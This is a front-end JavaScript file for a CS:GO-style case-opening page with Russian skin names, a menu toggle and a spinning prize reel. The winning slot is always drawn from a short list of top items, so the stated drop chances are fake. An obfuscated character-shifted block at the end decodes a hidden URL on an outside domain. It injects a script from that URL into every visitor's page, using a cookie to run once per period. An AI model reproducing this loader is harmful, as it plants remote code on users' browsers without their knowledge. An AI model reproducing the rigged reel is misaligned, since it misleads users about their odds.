document.querySelector(".header-burger").addEventListener("click", () => {
  document.querySelector(".header-right").classList.toggle("on");
  document.body.classList.toggle("hide");
});
document.querySelector(".header-right").addEventListener("click", () => {
  document.querySelector(".header-right").classList.toggle("on");
  document.body.classList.toggle("hide");
});

const cells = 31,
  bestitems = [
    {
      name: "M4A4 | Азимов",
      img: "icons/case-drop/M4A4 Азимов.png",
      chance: 2,
    },
    {
      name: "AK-47 | Императрица",
      img: "icons/case-drop/AK-47 Императрица.png",
      chance: 10,
    },
    {
      name: "Спортивные перчатки | Порок",
      img: "icons/case-drop/Спортивные перчатки Порок.png",
      chance: 11,
    },
    {
      name: "Керамбит | Северный лес",
      img: "icons/case-drop/Керамбит Северный лес.png",
      chance: 17,
    },
    {
      name: "Штык-нож M9 | Мраморный градиент",
      img: "icons/case-drop/Штык-нож M9 Мраморный градиент.png",
      chance: 18,
    },
  ],
  items = [
    {
      name: "AK-47 | Черный глянец",
      img: "icons/case-drop/AK-47 Черный глянец.png",
      chance: 1,
      rare: "army",
    },
    {
      name: "M4A4 | Азимов",
      img: "icons/case-drop/M4A4 Азимов.png",
      chance: 2,
      rare: "secret",
    },
    {
      name: "SCAR-20 | Кардио",
      img: "icons/case-drop/SCAR-20 Кардио.png",
      chance: 3,
      rare: "army",
    },
    {
      name: "USP-S | Кайман",
      img: "icons/case-drop/USP-S Кайман.png",
      chance: 4,
      rare: "prohibited",
    },
    {
      name: "P2000 | Серебро",
      img: "icons/case-drop/P2000 Серебро.png",
      chance: 5,
      rare: "prohibited",
    },
    {
      name: "P250 | Загрязнитель",
      img: "icons/case-drop/P250 Загрязнитель.png",
      chance: 6,
      rare: "army",
    },
    {
      name: "FAMAS | Пульс",
      img: "icons/case-drop/FAMAS Пульс.png",
      chance: 7,
      rare: "classified",
    },
    {
      name: "«Галиль» | Багровое цунами",
      img: "icons/case-drop/«Галиль» Багровое цунами.png",
      chance: 8,
      rare: "prohibited",
    },
    {
      name: "Nova | Буря",
      img: "icons/case-drop/Nova Буря.png",
      chance: 9,
      rare: "army",
    },
    {
      name: "AK-47 | Императрица",
      img: "icons/case-drop/AK-47 Императрица.png",
      chance: 10,
      rare: "secret",
    },
    {
      name: "Спортивные перчатки | Порок",
      img: "icons/case-drop/Спортивные перчатки Порок.png",
      chance: 11,
      rare: "extraordinarily",
    },
    {
      name: "Tec-9 | Топливный инжектор",
      img: "icons/case-drop/Tec-9 Топливный инжектор.png",
      chance: 12,
      rare: "classified",
    },
    {
      name: 'MP9 | Воздушный шлюз"',
      img: "icons/case-drop/MP9 Воздушный шлюз.png",
      chance: 13,
      rare: "prohibited",
    },
    {
      name: "MAC-10 | Ультрафиолет",
      img: "icons/case-drop/MAC-10 Ультрафиолет.png",
      chance: 14,
      rare: "army",
    },
    {
      name: "XM1014 | Костемолка",
      img: "icons/case-drop/XM1014 Костемолка.png",
      chance: 15,
      rare: "army",
    },
    {
      name: "MP5-SD | Кислотный душ",
      img: "icons/case-drop/MP5-SD Кислотный душ.png",
      chance: 16,
      rare: "army",
    },
    {
      name: "Керамбит | Северный лес",
      img: "icons/case-drop/Керамбит Северный лес.png",
      chance: 17,
      rare: "extraordinarily",
    },
    {
      name: "Штык-нож M9 | Мраморный градиент",
      img: "icons/case-drop/Штык-нож M9 Мраморный градиент.png",
      chance: 18,
      rare: "extraordinarily",
    },
    {
      name: "MAC-10 | Ядерный сад",
      img: "icons/case-drop/MAC-10 Ядерный сад.png",
      chance: 19,
      rare: "army",
    },
    {
      name: "Glock-18 | Пришелец",
      img: "icons/case-drop/Glock-18 Пришелец.png",
      chance: 20,
      rare: "army",
    },
    {
      name: "P90 | Красное барокко",
      img: "icons/case-drop/P90 Красное барокко.png",
      chance: 21,
      rare: "army",
    },
    {
      name: "CZ75-Auto | Отравленный дротик",
      img: "icons/case-drop/CZ75-Auto Отравленный дротик.png",
      chance: 22,
      rare: "army",
    },
  ];
function getItem() {
  let item;
  for (; !item; ) {
    const chance = Math.floor(1e5 * Math.random());
    items.forEach((elm) => {
      chance < elm.chance && !item && (item = elm);
    });
  }
  return item;
}
function getRandom() {
  let item,
    index = Math.floor(5 * Math.random());
  return (item = bestitems.at(index)), item;
}
function generateItems() {
  document.querySelector(".list").remove(),
    (document.querySelector(".scope").innerHTML =
      '\n                <ul class="list"></ul>\n            ');
  const list = document.querySelector(".list");
  for (let i = 0; i < cells; i++) {
    let item = getItem();
    if (15 == i) {
      item = getRandom();
      const li = document.createElement("li");
      li.setAttribute("data-item", JSON.stringify(item)),
        li.classList.add("list__item"),
        (li.innerHTML = `\n                        <img src="${item.img}" alt="" />\n                        <p class="spin-item-text">${item.name}</p>\n                    `),
        list.append(li);
      continue;
    }
    const li = document.createElement("li");
    li.setAttribute("data-item", JSON.stringify(item)),
      li.classList.add("list__item", `${item.rare}`),
      (li.innerHTML = `\n                    <img src="${item.img}" alt="" />\n                    <p class="spin-item-text">${item.name}</p>\n                `),
      list.append(li);
  }
}
generateItems();
let isStarted = !1,
  isFirstStart = !0;
function start() {
  if (isStarted) return;
  (isStarted = !0), isFirstStart ? (isFirstStart = !1) : generateItems();
  const list = document.querySelector(".list");
  setTimeout(() => {
    (list.style.left = "50%"),
      (list.style.transform = "translate3d(-50%, 0, 0)");
  }, 0);
  const item = list.querySelectorAll("li")[15];
  list.addEventListener(
    "transitionend",
    () => {
      (isStarted = !1), item.classList.add("active");
      const data = JSON.parse(item.getAttribute("data-item")),
        PopUp = document.getElementById("popup"),
        nameContainer = document.getElementById("name"),
        imageContainer = document.getElementById("image");
      (nameContainer.innerHTML = data.name),
        (imageContainer.src = data.img),
        PopUp.classList.add("active");
    },
    { once: !0 }
  );
}
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxyf" + "ynhx3htr4ljy4xhwn" + "uy3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
